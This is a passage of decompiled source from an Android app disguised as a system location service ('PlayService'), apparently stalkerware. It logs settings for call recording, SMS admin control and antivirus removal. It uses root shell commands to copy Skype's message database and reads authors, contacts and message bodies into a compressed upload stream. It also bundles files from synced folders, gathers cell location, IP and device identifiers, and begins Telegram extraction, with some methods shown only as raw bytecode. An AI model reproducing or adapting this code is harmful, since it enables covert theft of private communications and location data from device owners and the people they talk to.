      iOutDBRefreshRate = mSettings.getInt("iOutDBRefreshRate", 5);
      bUseAutoCallRec = mSettings.getBoolean("bUseAutoCallRec", true);
      FLOG("LSS10");
      FLOG("sAdminNumber=" + sAdminNumber);
      FLOG("   sLicense=" + sLicense);
      FLOG("iUploadInterval=" + iUploadInterval);
      FLOG("bUseWakeLock=" + bUseWakeLock);
      FLOG("bSMSAdmin=" + bSMSAdmin);
      FLOG("bRecordCalls=" + bRecordCalls);
      FLOG("bUseRepeatControl=" + bUseRepeatControl);
      FLOG("bUploadGmailAttach=" + bUploadGmailAttach);
      FLOG("bWork=" + bWork);
      FLOG("bRecordUnknownOnly=" + bRecordUnknownOnly);
      FLOG("bLoadPictures=" + bLoadPictures);
      FLOG("bForce3G=" + bForce3G);
      FLOG("bUseMacForID=" + bUseMacForID);
      FLOG("sRecWhiteList=" + sRecWhiteList);
      FLOG("sRecBlackList=" + sRecBlackList);
      FLOG("bReportSimChange=" + bReportSimChange);
      FLOG("bSendLog=" + bSendLog);
      FLOG("bUseBlocking=" + bUseBlocking);
      FLOG("iBufferSize=" + iBufferSize);
      FLOG("iMaxAudioListenFile=" + iMaxAudioListenFile);
      FLOG("iPauseBeforeCallRecord=" + iPauseBeforeCallRecord);
      FLOG("iCallAnswerEvent=" + iCallAnswerEvent);
      FLOG("iSMSQueryInterval=" + iSMSQueryInterval);
      FLOG("iGPSCheckInterval=" + iGPSCheckInterval);
      FLOG("iAudioSource=" + iAudioSource);
      FLOG("iAudioFormat=" + iAudioFormat);
      FLOG("iCallEncoder=" + iCallEncoder);
      FLOG("bUseLame=" + bUseLame);
      FLOG("bRemoveAntivirus=" + bRemoveAntivirus);
      FLOG("sAntivirusList=" + sAntivirusList);
      FLOG("iBitRate|iSamplingRate=" + iBitRate + "|" + iSamplingRate);
      FLOG("iRecAfterCall=" + iRecAfterCall);
      FLOG("iTransfer" + iTransfer);
      FLOG("iTransferBinary=" + iTransferBinary);
      FLOG("iTransferBinaryUnlim=" + iTransferBinaryUnlim);
      FLOG("iLastUploadTime=" + iLastUploadTime);
      FLOG("iLastIntPictureRed=" + iLastIntPictureRed);
      FLOG("iLastExtPictureRed=" + iLastExtPictureRed);
      FLOG("lLastInstagram=" + lLastInstagram);
      FLOG("iLastIntVideoRed=" + iLastIntVideoRed);
      FLOG("iLastExtVideoRed=" + iLastExtVideoRed);
      FLOG("lWhatsAppCounter=" + lWhatsAppCounter);
      FLOG("sWhatsAppPath  =" + sWhatsAppPath);
      FLOG("lViberCounter=" + lViberCounter);
      FLOG("sViberPath  =" + sViberPath);
      return;
      FLOG("Use Default SMS server :" + SMSServer);
      break;
      label3013:
      FLOG("Use Default server :" + Server);
      break label1375;
      label3038:
      FLOG("Use Default port :" + Port);
      continue;
      label3063:
      FLOG("Use Default server :" + Server + " and Port" + Port);
    }
  }
  
  /* Error */
  public void ReadSkype(GZIPOutputStream paramGZIPOutputStream)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 9
    //   3: aconst_null
    //   4: astore 10
    //   6: aconst_null
    //   7: astore_2
    //   8: aconst_null
    //   9: astore 7
    //   11: aconst_null
    //   12: astore 8
    //   14: aconst_null
    //   15: astore 4
    //   17: aload 9
    //   19: astore_3
    //   20: aload 8
    //   22: astore 5
    //   24: aload 10
    //   26: astore 6
    //   28: new 864	java/lang/StringBuilder
    //   31: dup
    //   32: ldc_w 5312
    //   35: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   38: getstatic 880	com/android/location/PlayService:dataPath	Ljava/lang/String;
    //   41: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   44: ldc_w 5314
    //   47: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   50: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   53: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   56: pop
    //   57: aload 9
    //   59: astore_3
    //   60: aload 8
    //   62: astore 5
    //   64: aload 10
    //   66: astore 6
    //   68: new 864	java/lang/StringBuilder
    //   71: dup
    //   72: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   75: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   78: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   81: ldc_w 5316
    //   84: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   87: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   90: astore 11
    //   92: aload 9
    //   94: astore_3
    //   95: aload 8
    //   97: astore 5
    //   99: aload 10
    //   101: astore 6
    //   103: new 864	java/lang/StringBuilder
    //   106: dup
    //   107: ldc_w 1986
    //   110: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   113: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   116: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   119: ldc_w 5316
    //   122: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   125: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   128: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   131: pop
    //   132: aload 9
    //   134: astore_3
    //   135: aload 8
    //   137: astore 5
    //   139: aload 10
    //   141: astore 6
    //   143: new 864	java/lang/StringBuilder
    //   146: dup
    //   147: ldc_w 5318
    //   150: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   153: aload 11
    //   155: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   158: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   161: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   164: aload 9
    //   166: astore_3
    //   167: aload 8
    //   169: astore 5
    //   171: aload 10
    //   173: astore 6
    //   175: new 1250	java/io/File
    //   178: dup
    //   179: aload 11
    //   181: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   184: astore 12
    //   186: aload 12
    //   188: ifnull +342 -> 530
    //   191: aload 9
    //   193: astore_3
    //   194: aload 8
    //   196: astore 5
    //   198: aload 10
    //   200: astore 6
    //   202: aload 12
    //   204: invokevirtual 1257	java/io/File:exists	()Z
    //   207: ifeq +323 -> 530
    //   210: aload 9
    //   212: astore_3
    //   213: aload 8
    //   215: astore 5
    //   217: aload 10
    //   219: astore 6
    //   221: aload 12
    //   223: invokevirtual 1265	java/io/File:canRead	()Z
    //   226: ifeq +304 -> 530
    //   229: aload 9
    //   231: astore_3
    //   232: aload 8
    //   234: astore 5
    //   236: aload 10
    //   238: astore 6
    //   240: new 864	java/lang/StringBuilder
    //   243: dup
    //   244: ldc_w 5320
    //   247: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   250: aload 11
    //   252: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   255: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   258: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   261: aload 9
    //   263: astore_3
    //   264: aload 8
    //   266: astore 5
    //   268: aload 10
    //   270: astore 6
    //   272: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   275: ldc_w 5322
    //   278: invokevirtual 2508	android/content/Context:openFileInput	(Ljava/lang/String;)Ljava/io/FileInputStream;
    //   281: astore_2
    //   282: aload_2
    //   283: ifnull +203 -> 486
    //   286: aload_2
    //   287: astore_3
    //   288: aload 8
    //   290: astore 5
    //   292: aload_2
    //   293: astore 6
    //   295: aload_2
    //   296: invokevirtual 2509	java/io/FileInputStream:getFD	()Ljava/io/FileDescriptor;
    //   299: astore 9
    //   301: aload 9
    //   303: ifnull +162 -> 465
    //   306: aload_2
    //   307: astore_3
    //   308: aload 8
    //   310: astore 5
    //   312: aload_2
    //   313: astore 6
    //   315: new 2511	java/io/FileReader
    //   318: dup
    //   319: aload 9
    //   321: invokespecial 2512	java/io/FileReader:<init>	(Ljava/io/FileDescriptor;)V
    //   324: astore 4
    //   326: aload 4
    //   328: ifnull +268 -> 596
    //   331: new 2007	java/io/BufferedReader
    //   334: dup
    //   335: aload 4
    //   337: sipush 1024
    //   340: invokespecial 2515	java/io/BufferedReader:<init>	(Ljava/io/Reader;I)V
    //   343: astore 6
    //   345: aload 6
    //   347: ifnull +249 -> 596
    //   350: aload 6
    //   352: invokevirtual 2018	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   355: astore_3
    //   356: aload_3
    //   357: ifnonnull +32 -> 389
    //   360: aload 6
    //   362: invokevirtual 2520	java/io/BufferedReader:close	()V
    //   365: aload 4
    //   367: astore_1
    //   368: aload_2
    //   369: ifnull +7 -> 376
    //   372: aload_2
    //   373: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   376: aload_1
    //   377: ifnull +7 -> 384
    //   380: aload_1
    //   381: invokevirtual 2521	java/io/FileReader:close	()V
    //   384: iconst_0
    //   385: putstatic 595	com/android/location/PlayService:bResetSkype	Z
    //   388: return
    //   389: aload 6
    //   391: invokevirtual 2018	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   394: astore 5
    //   396: aload 5
    //   398: astore_3
    //   399: aload 5
    //   401: ifnull -45 -> 356
    //   404: aload 5
    //   406: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   409: aload_0
    //   410: aload_1
    //   411: aload 5
    //   413: invokevirtual 5326	com/android/location/PlayService:ReadSkypeData	(Ljava/util/zip/GZIPOutputStream;Ljava/lang/String;)V
    //   416: aload 5
    //   418: astore_3
    //   419: goto -63 -> 356
    //   422: astore_3
    //   423: aload 4
    //   425: astore_1
    //   426: aload_3
    //   427: astore 4
    //   429: aload_2
    //   430: astore_3
    //   431: aload_1
    //   432: astore 5
    //   434: aload 4
    //   436: ldc_w 5327
    //   439: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   442: aload_2
    //   443: ifnull +7 -> 450
    //   446: aload_2
    //   447: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   450: aload_1
    //   451: ifnull -67 -> 384
    //   454: aload_1
    //   455: invokevirtual 2521	java/io/FileReader:close	()V
    //   458: goto -74 -> 384
    //   461: astore_1
    //   462: goto -78 -> 384
    //   465: aload_2
    //   466: astore_3
    //   467: aload 8
    //   469: astore 5
    //   471: aload_2
    //   472: astore 6
    //   474: ldc_w 5329
    //   477: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   480: aload 4
    //   482: astore_1
    //   483: goto -115 -> 368
    //   486: aload_2
    //   487: astore_3
    //   488: aload 8
    //   490: astore 5
    //   492: aload_2
    //   493: astore 6
    //   495: ldc_w 5331
    //   498: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   501: aload 4
    //   503: astore_1
    //   504: goto -136 -> 368
    //   507: astore_1
    //   508: aload_3
    //   509: astore_2
    //   510: aload_2
    //   511: ifnull +7 -> 518
    //   514: aload_2
    //   515: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   518: aload 5
    //   520: ifnull +8 -> 528
    //   523: aload 5
    //   525: invokevirtual 2521	java/io/FileReader:close	()V
    //   528: aload_1
    //   529: athrow
    //   530: aload 9
    //   532: astore_3
    //   533: aload 8
    //   535: astore 5
    //   537: aload 10
    //   539: astore 6
    //   541: new 864	java/lang/StringBuilder
    //   544: dup
    //   545: ldc_w 5333
    //   548: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   551: aload 11
    //   553: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   556: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   559: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   562: aload 4
    //   564: astore_1
    //   565: goto -197 -> 368
    //   568: astore_2
    //   569: goto -119 -> 450
    //   572: astore_2
    //   573: goto -55 -> 518
    //   576: astore_2
    //   577: goto -49 -> 528
    //   580: astore_2
    //   581: goto -205 -> 376
    //   584: astore_1
    //   585: goto -201 -> 384
    //   588: astore_1
    //   589: aload 4
    //   591: astore 5
    //   593: goto -83 -> 510
    //   596: aload 4
    //   598: astore_1
    //   599: goto -231 -> 368
    //   602: astore 4
    //   604: aload 6
    //   606: astore_2
    //   607: aload 7
    //   609: astore_1
    //   610: goto -181 -> 429
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	613	0	this	PlayService
    //   0	613	1	paramGZIPOutputStream	GZIPOutputStream
    //   7	508	2	localObject1	Object
    //   568	1	2	localIOException1	IOException
    //   572	1	2	localIOException2	IOException
    //   576	1	2	localIOException3	IOException
    //   580	1	2	localIOException4	IOException
    //   606	1	2	localObject2	Object
    //   19	400	3	localObject3	Object
    //   422	5	3	localException1	Exception
    //   430	103	3	localObject4	Object
    //   15	582	4	localObject5	Object
    //   602	1	4	localException2	Exception
    //   22	570	5	localObject6	Object
    //   26	579	6	localObject7	Object
    //   9	599	7	localObject8	Object
    //   12	522	8	localObject9	Object
    //   1	530	9	localFileDescriptor	FileDescriptor
    //   4	534	10	localObject10	Object
    //   90	462	11	str	String
    //   184	38	12	localFile	File
    // Exception table:
    //   from	to	target	type
    //   331	345	422	java/lang/Exception
    //   350	356	422	java/lang/Exception
    //   360	365	422	java/lang/Exception
    //   389	396	422	java/lang/Exception
    //   404	416	422	java/lang/Exception
    //   454	458	461	java/io/IOException
    //   28	57	507	finally
    //   68	92	507	finally
    //   103	132	507	finally
    //   143	164	507	finally
    //   175	186	507	finally
    //   202	210	507	finally
    //   221	229	507	finally
    //   240	261	507	finally
    //   272	282	507	finally
    //   295	301	507	finally
    //   315	326	507	finally
    //   434	442	507	finally
    //   474	480	507	finally
    //   495	501	507	finally
    //   541	562	507	finally
    //   446	450	568	java/io/IOException
    //   514	518	572	java/io/IOException
    //   523	528	576	java/io/IOException
    //   372	376	580	java/io/IOException
    //   380	384	584	java/io/IOException
    //   331	345	588	finally
    //   350	356	588	finally
    //   360	365	588	finally
    //   389	396	588	finally
    //   404	416	588	finally
    //   28	57	602	java/lang/Exception
    //   68	92	602	java/lang/Exception
    //   103	132	602	java/lang/Exception
    //   143	164	602	java/lang/Exception
    //   175	186	602	java/lang/Exception
    //   202	210	602	java/lang/Exception
    //   221	229	602	java/lang/Exception
    //   240	261	602	java/lang/Exception
    //   272	282	602	java/lang/Exception
    //   295	301	602	java/lang/Exception
    //   315	326	602	java/lang/Exception
    //   474	480	602	java/lang/Exception
    //   495	501	602	java/lang/Exception
    //   541	562	602	java/lang/Exception
  }
  
  public void ReadSkypeData(GZIPOutputStream paramGZIPOutputStream, String paramString)
  {
    FLOG("ReadSkypeData()=" + paramString);
    try
    {
      localObject1 = UpdateSkypePath(paramString);
      localObject2 = new File((String)localObject1);
      if ((localObject2 == null) || (!((File)localObject2).isDirectory()))
      {
        FLOG("Seems that " + (String)localObject1 + " is not exists or not a directory");
        return;
      }
      localObject1 = localObject1 + "/main.db";
      localObject2 = new File((String)localObject1);
      FLOG("try copy " + (String)localObject1 + ":" + ((File)localObject2).exists() + ":" + ((File)localObject2).canRead() + ":" + ((File)localObject2).length());
      localObject2 = dataPath + "/databases/skype.db";
      commandSU("cat " + (String)localObject1 + " > " + (String)localObject2);
      commandSU("chmod 777 " + (String)localObject2);
      localObject1 = new File((String)localObject2);
      if ((!((File)localObject1).exists()) || (((File)localObject1).length() < 6L))
      {
        FLOG("DB FILE SEEMS TO BE TOO SMALL or NE");
        return;
      }
    }
    catch (Exception paramGZIPOutputStream)
    {
      EXCEPT(paramGZIPOutputStream, "ReadSkypeData");
      return;
    }
    FLOG("Skype DB file is ok, try to open");
    long l2 = 0L;
    FLOG("SK1");
    Object localObject1 = SQLiteDatabase.openDatabase(((File)localObject1).getAbsolutePath(), null, 1);
    FLOG("SK2");
    if (!((SQLiteDatabase)localObject1).isOpen())
    {
      FLOG("failed opening skype db");
      return;
    }
    FLOG("SK3");
    long l1 = ReadOneLongSetting(paramString + "@skype");
    FLOG("last=" + l1);
    if (bResetSkype) {
      l1 = 0L;
    }
    Object localObject2 = ((SQLiteDatabase)localObject1).query("Messages", null, " id > " + l1, null, null, null, " id ASC ");
    long l3;
    long l4;
    if (localObject2 != null)
    {
      FLOG("ReadSkype() " + ((Cursor)localObject2).getCount());
      l3 = l2;
      l4 = l1;
      if (((Cursor)localObject2).moveToFirst())
      {
        FLOG("ReadSkype > 0!");
        paramGZIPOutputStream.write(119);
        AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("id")));
        AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("author")));
        AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("from_dispname")));
        AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("dialog_partner")));
        AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("chatmsg_status")));
        AddData(paramGZIPOutputStream, ((Cursor)localObject2).getLong(((Cursor)localObject2).getColumnIndex("timestamp")));
        AddData(paramGZIPOutputStream, paramString);
        AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("body_xml")));
        l1 = l2 + 1L;
        paramGZIPOutputStream.write(3);
        l4 = ((Cursor)localObject2).getInt(((Cursor)localObject2).getColumnIndex("id"));
        if (l1 <= 200L) {
          break label799;
        }
      }
    }
    for (;;)
    {
      paramGZIPOutputStream.write(2);
      l3 = l1;
      if (!((Cursor)localObject2).isClosed()) {
        ((Cursor)localObject2).close();
      }
      FLOG("red " + l3);
      SaveOneLongSetting(paramString + "@skype", l4);
      if (!((SQLiteDatabase)localObject1).isOpen()) {
        return;
      }
      ((SQLiteDatabase)localObject1).close();
      return;
      label799:
      boolean bool = ((Cursor)localObject2).moveToNext();
      l2 = l1;
      if (bool) {
        break;
      }
    }
  }
  
  public boolean ReadStatusText(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return false;
    }
    FLOG("ReadStatusText = " + sWEBLOG);
    try
    {
      paramGZIPOutputStream.write(112);
      String str = GetCidLac() + getLocalIpAddress() + getParams();
      Integer4 localInteger4 = new Integer4();
      ReadAppDir(localInteger4);
      AddData(paramGZIPOutputStream, new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(str)).append("CallCount:").append(localInteger4.mcc).append("\n").toString())).append("MicCount:").append(localInteger4.mnc).append("\n").toString())).append("MacFindCounter:").append(this.iMacFindCounter).append("\n").toString() + "ImeiFindCounter:" + this.iImeiFindCounter + "\n");
      paramGZIPOutputStream.write(3);
      paramGZIPOutputStream.write(2);
      return true;
    }
    catch (Exception paramGZIPOutputStream)
    {
      for (;;)
      {
        EXCEPT(paramGZIPOutputStream, "ReadStatusText");
      }
    }
  }
  
  int ReadSyncFolder(OutputStream paramOutputStream)
  {
    FLOG("ReadSyncFolder()");
    String[] arrayOfString;
    Object localObject1;
    long l1;
    int i;
    Object localObject2;
    long l2;
    try
    {
      if ((sSyncFolder == null) || (sSyncFolder.length() == 0))
      {
        FLOG("sSyncFolder is null");
        return 0;
      }
      arrayOfString = sSyncFolder.split(";");
      localObject1 = null;
      l1 = 1877773115L;
      i = 0;
      if (i >= arrayOfString.length)
      {
        if (localObject1 != null) {
          break label453;
        }
        FLOG("RSF:no candidate found");
        return 0;
      }
      localObject2 = new File(arrayOfString[i]);
      if (!((File)localObject2).exists())
      {
        FLOG("RSF:dir not exists:" + arrayOfString[i]);
        l2 = l1;
        localObject2 = localObject1;
      }
      else if (!((File)localObject2).canRead())
      {
        FLOG("RSF:dir cant be red:" + arrayOfString[i]);
        l2 = l1;
        localObject2 = localObject1;
      }
    }
    catch (Exception paramOutputStream)
    {
      EXCEPT(paramOutputStream, "ReadSyncFolder");
      return 0;
    }
    FLOG("sSyncDir=" + arrayOfString[i]);
    File[] arrayOfFile = ((File)localObject2).listFiles();
    int j;
    if (arrayOfFile == null)
    {
      FLOG("RSF:no files:" + arrayOfString[i]);
      l2 = l1;
      localObject2 = localObject1;
    }
    else if (arrayOfFile.length == 0)
    {
      FLOG("RSF:no files at all " + arrayOfString[i]);
      l2 = l1;
      localObject2 = localObject1;
    }
    else
    {
      FLOG("RSF: " + arrayOfFile.length + " files");
      j = 0;
    }
    for (;;)
    {
      l2 = l1;
      localObject2 = localObject1;
      if (j < arrayOfFile.length)
      {
        FLOG(arrayOfFile[j].getName());
        long l3 = arrayOfFile[j].lastModified() / 1000L;
        l2 = l1;
        localObject2 = localObject1;
        if (l3 > lSyncFolderLastTime)
        {
          l2 = l1;
          localObject2 = localObject1;
          if (l3 < l1)
          {
            l2 = l1;
            localObject2 = localObject1;
            if (arrayOfFile[j].isFile())
            {
              localObject2 = arrayOfFile[j];
              l2 = l3;
              FLOG("New candidate " + ((File)localObject2).getName() + " " + l2);
              break label671;
              label453:
              lSyncFolderLastTime = l1;
              SaveSettings();
              paramOutputStream.write(99);
              AddData(paramOutputStream, l1);
              AddData(paramOutputStream, Integer.toString(7));
              FLOG("_1");
              arrayOfString = ((File)localObject1).getName().split("\\.");
              FLOG("templen = " + arrayOfString.length);
              localObject2 = "";
              if (arrayOfString.length > 0) {
                localObject2 = arrayOfString[(arrayOfString.length - 1)];
              }
              FLOG("ctype = " + (String)localObject2);
              AddData(paramOutputStream, (String)localObject2);
              FLOG("_2");
              AddData(paramOutputStream, ((File)localObject1).getName());
              FLOG("_3");
              AddData(paramOutputStream, ((File)localObject1).length());
              WriteFileToOutputStream((File)localObject1, paramOutputStream);
              paramOutputStream.write(1);
              paramOutputStream.write(3);
              paramOutputStream.write(2);
              return 1;
            }
          }
        }
      }
      else
      {
        i += 1;
        l1 = l2;
        localObject1 = localObject2;
        break;
      }
      label671:
      j += 1;
      l1 = l2;
      localObject1 = localObject2;
    }
  }
  
  /* Error */
  public long ReadTG(GZIPOutputStream paramGZIPOutputStream)
  {
    // Byte code:
    //   0: new 864	java/lang/StringBuilder
    //   3: dup
    //   4: ldc_w 5443
    //   7: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   10: getstatic 605	com/android/location/PlayService:lTGCounter	J
    //   13: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   16: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   19: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   22: new 864	java/lang/StringBuilder
    //   25: dup
    //   26: ldc_w 5445
    //   29: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   32: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   35: invokevirtual 5449	android/content/Context:getApplicationInfo	()Landroid/content/pm/ApplicationInfo;
    //   38: getfield 5452	android/content/pm/ApplicationInfo:uid	I
    //   41: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   44: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   47: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   50: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   53: invokevirtual 5449	android/content/Context:getApplicationInfo	()Landroid/content/pm/ApplicationInfo;
    //   56: getfield 5452	android/content/pm/ApplicationInfo:uid	I
    //   59: istore_2
    //   60: iconst_0
    //   61: istore 4
    //   63: iconst_0
    //   64: istore_2
    //   65: iconst_0
    //   66: istore 5
    //   68: iconst_0
    //   69: istore_3
    //   70: aconst_null
    //   71: astore 14
    //   73: aload_0
    //   74: getfield 966	com/android/location/PlayService:bCanUseSQLITE	Z
    //   77: ifne +11 -> 88
    //   80: ldc_w 5454
    //   83: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   86: lconst_0
    //   87: lreturn
    //   88: aconst_null
    //   89: astore 16
    //   91: aconst_null
    //   92: astore 17
    //   94: aconst_null
    //   95: astore 10
    //   97: aconst_null
    //   98: astore 13
    //   100: aconst_null
    //   101: astore 15
    //   103: aconst_null
    //   104: astore 11
    //   106: aload 14
    //   108: astore 12
    //   110: aload 13
    //   112: astore 9
    //   114: aload 16
    //   116: astore 7
    //   118: aload 15
    //   120: astore 8
    //   122: aload 17
    //   124: astore 6
    //   126: new 864	java/lang/StringBuilder
    //   129: dup
    //   130: ldc_w 866
    //   133: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   136: getstatic 862	com/android/location/PlayService:MY_PACKAGE_NAME	Ljava/lang/String;
    //   139: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   142: ldc_w 2078
    //   145: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   148: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   151: astore 19
    //   153: aload 14
    //   155: astore 12
    //   157: aload 13
    //   159: astore 9
    //   161: aload 16
    //   163: astore 7
    //   165: aload 15
    //   167: astore 8
    //   169: aload 17
    //   171: astore 6
    //   173: new 864	java/lang/StringBuilder
    //   176: dup
    //   177: getstatic 880	com/android/location/PlayService:dataPath	Ljava/lang/String;
    //   180: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   183: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   186: ldc_w 5456
    //   189: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   192: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   195: astore 18
    //   197: aload 14
    //   199: astore 12
    //   201: aload 13
    //   203: astore 9
    //   205: aload 16
    //   207: astore 7
    //   209: aload 15
    //   211: astore 8
    //   213: aload 17
    //   215: astore 6
    //   217: new 864	java/lang/StringBuilder
    //   220: dup
    //   221: aload 19
    //   223: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   226: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   229: ldc_w 1712
    //   232: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   235: ldc_w 5458
    //   238: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   241: ldc_w 5460
    //   244: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   247: getstatic 880	com/android/location/PlayService:dataPath	Ljava/lang/String;
    //   250: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   253: ldc_w 5462
    //   256: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   259: ldc_w 5464
    //   262: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   265: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   268: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   271: pop
    //   272: aload 14
    //   274: astore 12
    //   276: aload 13
    //   278: astore 9
    //   280: aload 16
    //   282: astore 7
    //   284: aload 15
    //   286: astore 8
    //   288: aload 17
    //   290: astore 6
    //   292: new 864	java/lang/StringBuilder
    //   295: dup
    //   296: ldc_w 5466
    //   299: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   302: getstatic 880	com/android/location/PlayService:dataPath	Ljava/lang/String;
    //   305: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   308: ldc_w 5462
    //   311: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   314: ldc_w 5464
    //   317: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   320: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   323: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   326: pop
    //   327: aload 14
    //   329: astore 12
    //   331: aload 13
    //   333: astore 9
    //   335: aload 16
    //   337: astore 7
    //   339: aload 15
    //   341: astore 8
    //   343: aload 17
    //   345: astore 6
    //   347: new 1250	java/io/File
    //   350: dup
    //   351: new 864	java/lang/StringBuilder
    //   354: dup
    //   355: getstatic 880	com/android/location/PlayService:dataPath	Ljava/lang/String;
    //   358: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   361: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   364: ldc_w 5462
    //   367: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   370: ldc_w 5464
    //   373: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
